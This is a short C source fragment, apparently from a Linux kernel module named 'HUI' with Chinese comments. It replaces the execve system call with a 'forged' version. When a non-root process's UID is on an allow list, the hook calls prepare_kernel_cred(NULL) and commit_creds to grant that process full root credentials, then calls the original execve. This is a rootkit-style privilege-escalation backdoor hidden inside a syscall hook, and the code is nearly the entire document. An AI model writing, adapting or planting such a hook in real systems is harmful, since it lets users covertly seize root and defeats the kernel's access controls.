#include "hui.h"

// 核心提权逻辑
void hui_elevate_root(void) {
    struct cred *new_cred;
    if (!current->mm) return;
    new_cred = prepare_kernel_cred(NULL);
    if (new_cred) {
        commit_creds(new_cred);
        pr_info("HUI: [%s] 提权成功！\n", current->comm);
    }
}

// 伪造的 execve 系统调用
asmlinkage long hui_hooked_execve_compat(const struct pt_regs *regs) {
    uid_t uid = HUI_CURRENT_UID;
    
    // 检查该 UID 是否被允许
    if (uid != 0 && hui_is_uid_allowed(uid)) {
        hui_elevate_root();
    }
    
    // 调用原函数
    return hui_state.original_execve(regs);
}
